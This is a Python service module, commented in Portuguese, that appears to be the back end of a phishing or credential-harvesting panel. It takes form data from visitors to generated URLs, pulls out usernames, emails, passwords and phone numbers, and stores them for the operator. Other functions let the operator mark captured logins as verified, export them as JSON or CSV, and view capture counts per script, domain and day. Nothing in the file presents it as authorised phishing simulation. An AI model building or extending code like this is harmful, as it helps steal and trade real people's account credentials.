from datetime import datetime, timedelta
from src.models.user import db, CapturedCredential, Visitor, GeneratedURL, User
import json
import csv
import io

class CredentialService:
    """Serviço para gerenciar credenciais capturadas"""
    
    @staticmethod
    def capture_credentials(visitor_id, generated_url_id, form_data):
        """Captura e armazena credenciais de um formulário"""
        try:
            visitor = Visitor.query.get(visitor_id)
            generated_url = GeneratedURL.query.get(generated_url_id)
            
            if not visitor or not generated_url:
                return None
            
            # Extrair campos comuns
            username = form_data.get('username') or form_data.get('user') or form_data.get('login')
            email = form_data.get('email') or form_data.get('e-mail')
            password = form_data.get('password') or form_data.get('pass') or form_data.get('senha')
            phone = form_data.get('phone') or form_data.get('telefone') or form_data.get('celular')
            
            # Criar registro de credencial
            credential = CapturedCredential(
                visitor_id=visitor_id,
                generated_url_id=generated_url_id,
                user_id=generated_url.user_id,
                script_name=generated_url.script.name if generated_url.script else 'Desconhecido',
                domain_used=generated_url.domain.domain_name if generated_url.domain else 'Desconhecido'
            )
            
            # Definir campos criptografados
            if username:
                credential.set_username(username)
            if email:
                credential.set_email(email)
            if password:
                credential.set_password(password)
            if phone:
                credential.set_phone(phone)
            
            # Armazenar nomes dos campos e dados extras
            field_names = list(form_data.keys())
            credential.set_field_names(field_names)
            credential.set_form_data(form_data)
            
            db.session.add(credential)
            db.session.commit()
            
            return credential
            
        except Exception as e:
            db.session.rollback()
            print(f"Erro ao capturar credenciais: {e}")
            return None
    
    @staticmethod
    def get_user_credentials(user_id, anonymize=False, limit=100, offset=0):
        """Obtém credenciais capturadas de um usuário"""
        try:
            query = CapturedCredential.query.filter_by(user_id=user_id)
            
            total = query.count()
            credentials = query.order_by(
                CapturedCredential.captured_at.desc()
            ).limit(limit).offset(offset).all()
            
            return {
                'credentials': [c.to_dict(anonymize=anonymize) for c in credentials],
                'total': total,
                'limit': limit,
                'offset': offset
            }
            
        except Exception as e:
            print(f"Erro ao buscar credenciais: {e}")
            return {'credentials': [], 'total': 0, 'limit': limit, 'offset': offset}
    
    @staticmethod
    def get_credential_by_id(credential_id, user_id, anonymize=False):
        """Obtém uma credencial específica"""
        try:
            credential = CapturedCredential.query.filter_by(
                id=credential_id,
                user_id=user_id
            ).first()
            
            if credential:
                return credential.to_dict(anonymize=anonymize)
            return None
            
        except Exception as e:
            print(f"Erro ao buscar credencial: {e}")
            return None
    
    @staticmethod
    def verify_credential(credential_id, user_id):
        """Marca uma credencial como verificada"""
        try:
            credential = CapturedCredential.query.filter_by(
                id=credential_id,
                user_id=user_id
            ).first()
            
            if credential:
                credential.is_verified = True
                credential.verified_at = datetime.utcnow()
                db.session.commit()
                return True
            
            return False
            
        except Exception as e:
            db.session.rollback()
            print(f"Erro ao verificar credencial: {e}")
            return False
    
    @staticmethod
    def anonymize_credential(credential_id, user_id):
        """Anonimiza uma credencial"""
        try:
            credential = CapturedCredential.query.filter_by(
                id=credential_id,
                user_id=user_id
            ).first()
            
            if credential:
                credential.anonymize()
                db.session.commit()
                return True
            
            return False
            
        except Exception as e:
            db.session.rollback()
            print(f"Erro ao anonimizar credencial: {e}")
            return False
    
    @staticmethod
    def delete_credential(credential_id, user_id):
        """Remove uma credencial"""
        try:
            credential = CapturedCredential.query.filter_by(
                id=credential_id,
                user_id=user_id
            ).first()
            
            if credential:
                db.session.delete(credential)
                db.session.commit()
                return True
            
            return False
            
        except Exception as e:
            db.session.rollback()
            print(f"Erro ao deletar credencial: {e}")
            return False
    
    @staticmethod
    def export_credentials(user_id, format='json', anonymize=True, filters=None):
        """Exporta credenciais em diferentes formatos"""
        try:
            query = CapturedCredential.query.filter_by(user_id=user_id)
            
            # Aplicar filtros se fornecidos
            if filters:
                if filters.get('script_name'):
                    query = query.filter(CapturedCredential.script_name.like(f"%{filters['script_name']}%"))
                if filters.get('domain_used'):
                    query = query.filter(CapturedCredential.domain_used.like(f"%{filters['domain_used']}%"))
                if filters.get('verified_only'):
                    query = query.filter_by(is_verified=True)
                if filters.get('date_from'):
                    query = query.filter(CapturedCredential.captured_at >= filters['date_from'])
                if filters.get('date_to'):
                    query = query.filter(CapturedCredential.captured_at <= filters['date_to'])
            
            credentials = query.order_by(CapturedCredential.captured_at.desc()).all()
            
            # Marcar como exportadas
            for credential in credentials:
                credential.is_exported = True
                credential.exported_at = datetime.utcnow()
            
            db.session.commit()
            
            # Converter para formato solicitado
            data = [c.to_dict(anonymize=anonymize) for c in credentials]
            
            if format.lower() == 'json':
                return json.dumps(data, indent=2, default=str)
            
            elif format.lower() == 'csv':
                if not data:
                    return ""
                
                output = io.StringIO()
                fieldnames = data[0].keys()
                writer = csv.DictWriter(output, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(data)
                return output.getvalue()
            
            else:
                return json.dumps(data, indent=2, default=str)
                
        except Exception as e:
            print(f"Erro ao exportar credenciais: {e}")
            return None
    
    @staticmethod
    def get_statistics(user_id):
        """Obtém estatísticas das credenciais capturadas"""
        try:
            total = CapturedCredential.query.filter_by(user_id=user_id).count()
            verified = CapturedCredential.query.filter_by(user_id=user_id, is_verified=True).count()
            anonymized = CapturedCredential.query.filter_by(user_id=user_id, is_anonymized=True).count()
            exported = CapturedCredential.query.filter_by(user_id=user_id, is_exported=True).count()
            
            # Estatísticas por script
            script_stats = db.session.query(
                CapturedCredential.script_name,
                db.func.count(CapturedCredential.id).label('count')
            ).filter_by(user_id=user_id).group_by(
                CapturedCredential.script_name
            ).all()
            
            # Estatísticas por domínio
            domain_stats = db.session.query(
                CapturedCredential.domain_used,
                db.func.count(CapturedCredential.id).label('count')
            ).filter_by(user_id=user_id).group_by(
                CapturedCredential.domain_used
            ).all()
            
            # Capturas por dia (últimos 30 dias)
            thirty_days_ago = datetime.utcnow() - timedelta(days=30)
            daily_stats = db.session.query(
                db.func.date(CapturedCredential.captured_at).label('date'),
                db.func.count(CapturedCredential.id).label('count')
            ).filter(
                CapturedCredential.user_id == user_id,
                CapturedCredential.captured_at >= thirty_days_ago
            ).group_by(
                db.func.date(CapturedCredential.captured_at)
            ).all()
            
            return {
                'total': total,
                'verified': verified,
                'anonymized': anonymized,
                'exported': exported,
                'verification_rate': (verified / total * 100) if total > 0 else 0,
                'script_stats': [{'script': s[0], 'count': s[1]} for s in script_stats],
                'domain_stats': [{'domain': d[0], 'count': d[1]} for d in domain_stats],
                'daily_stats': [{'date': str(d[0]), 'count': d[1]} for d in daily_stats]
            }
            
        except Exception as e:
            print(f"Erro ao obter estatísticas: {e}")
            return {
                'total': 0, 'verified': 0, 'anonymized': 0, 'exported': 0,
                'verification_rate': 0, 'script_stats': [], 'domain_stats': [], 'daily_stats': []
            }
    
    @staticmethod
    def search_credentials(user_id, search_term, anonymize=True):
        """Busca credenciais por termo"""
        try:
            # Buscar em campos não sensíveis
            query = CapturedCredential.query.filter_by(user_id=user_id).filter(
                db.or_(
                    CapturedCredential.script_name.like(f"%{search_term}%"),
                    CapturedCredential.domain_used.like(f"%{search_term}%"),
                    CapturedCredential.capture_method.like(f"%{search_term}%")
                )
            )
            
            credentials = query.order_by(CapturedCredential.captured_at.desc()).all()
            return [c.to_dict(anonymize=anonymize) for c in credentials]
            
        except Exception as e:
            print(f"Erro na busca: {e}")
            return []

